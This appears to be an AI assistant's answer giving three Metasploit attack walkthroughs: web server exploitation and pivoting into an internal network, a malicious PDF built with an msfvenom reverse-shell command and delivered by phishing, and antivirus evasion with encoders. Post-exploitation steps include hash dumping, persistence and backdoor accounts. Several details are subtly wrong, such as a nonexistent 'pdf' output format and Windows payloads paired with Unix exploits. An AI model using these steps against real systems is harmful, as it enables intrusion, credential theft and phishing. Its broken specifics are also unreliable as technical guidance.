# Sophisticated Metasploit Examples

## Sophisticated Metasploit Examples
**Example 1: Exploiting a Web Server and Pivoting to an Internal Network**

This example involves a multi-stage attack that exploits a web server vulnerability, uses Meterpreter for pivoting, and ultimately targets a system on an internal network.

1. **Reconnaissance:** Begin by gathering information about the target organisation and its web server using techniques like DNS enumeration, open-source intelligence gathering, and website analysis \[1, 2]. Identify potential web server vulnerabilities like outdated software, misconfigured settings, or known exploits \[3].
2. **Web Server Exploitation:** Select a suitable Metasploit exploit based on the identified web server vulnerability. For example, if the server uses a vulnerable version of Apache, use an exploit like exploit/multi/http/apache\_mod\_cgi\_bash\_env. Configure the exploit with the target IP address and any other required options \[4-6]. Choose a Meterpreter payload, like windows/meterpreter/reverse\_tcp, to gain a sophisticated shell on the compromised web server \[7, 8].
3. **Pivoting:** Once you obtain a Meterpreter session on the web server, use the route command to add a route to the internal network through the compromised host \[9-11]. You can use modules like post/windows/gather/arp\_scanner to scan the internal network and discover additional targets \[12, 13].
4. **Internal System Exploitation:** After identifying a vulnerable system on the internal network, select a suitable exploit based on the operating system and any known vulnerabilities. For example, use exploit/windows/smb/psexec for a Windows system with weak credentials. Configure the exploit with the target IP address and any required credentials or hashes. Choose a Meterpreter payload for a more sophisticated shell on the internal system \[14-17].
5. **Post-Exploitation:** Utilise Meterpreter's extensive capabilities on the compromised internal system. Gather system information with sysinfo, escalate privileges, dump password hashes with hashdump, or establish persistence using techniques like creating a backdoor or adding a user \[18, 19].

**Example 2: Client-Side Attack with a Malicious PDF**

This example demonstrates a client-side attack using a specially crafted PDF file to exploit a vulnerability in a PDF reader application.

1. **Payload Creation:** Utilise msfvenom to generate a malicious PDF file containing a Meterpreter payload. Use a command like:
2. msfvenom -p windows/meterpreter/reverse\_tcp LHOST=\[Your IP Address] LPORT=4444 -f pdf > malicious.pdf
3. This command will create a PDF file named malicious.pdf with a reverse Meterpreter payload that connects back to your IP address on port 4444 \[20-24].
4. **Delivery:** Deliver the malicious PDF file to the target user. This can be achieved through social engineering techniques like phishing emails with a compelling subject line and a link to the file, or by hosting the file on a compromised website.
5. **Exploitation:** When the target user opens the malicious PDF, the embedded exploit will trigger, exploiting a vulnerability in the PDF reader application. The Meterpreter payload will be executed, establishing a connection back to your attacking machine.
6. **Post-Exploitation:** With a Meterpreter session established, you can perform various post-exploitation activities like escalating privileges, executing commands, stealing sensitive data, or pivoting to other systems within the target's network.

**Example 3: Bypassing Antivirus with Encoders**

This example showcases how to use Metasploit's encoding capabilities to evade antivirus detection and successfully deliver a payload.

1. **Exploit Selection:** Choose an exploit that suits the target system's vulnerabilities. For instance, if the target uses a vulnerable version of Samba, you might use exploit/multi/samba/usermap\_script.
2. **Payload Encoding:** Before selecting a payload, use the encoders command in msfconsole to view available encoders. Choose an encoder that is known for its ability to bypass antivirus solutions. Examples include x86/shikata\_ga\_nai, cmd/powershell\_base64, or x86/fnstenv\_mov.
3. msf exploit(exploit/multi/samba/usermap\_script) > set ENCODER x86/shikata\_ga\_nai
4. **Payload Selection and Configuration:** Select your desired payload, for example, windows/meterpreter/reverse\_tcp. Configure the payload with the appropriate options like LHOST and LPORT.
5. **Exploitation:** Run the exploit. The chosen encoder will obfuscate the payload, potentially bypassing antivirus checks and increasing the chances of a successful attack.

**Important Considerations**

- These examples provide a starting point for understanding sophisticated Metasploit attacks. You can further explore different exploit modules, payloads, and techniques by researching specific vulnerabilities, studying Metasploit documentation, and experimenting in a controlled environment.
- It's crucial to remember that using Metasploit against systems without proper authorisation is illegal and unethical. Always conduct your experiments in a controlled and ethical environment.

Let me know if you need further clarification or assistance with any specific aspect of these examples.
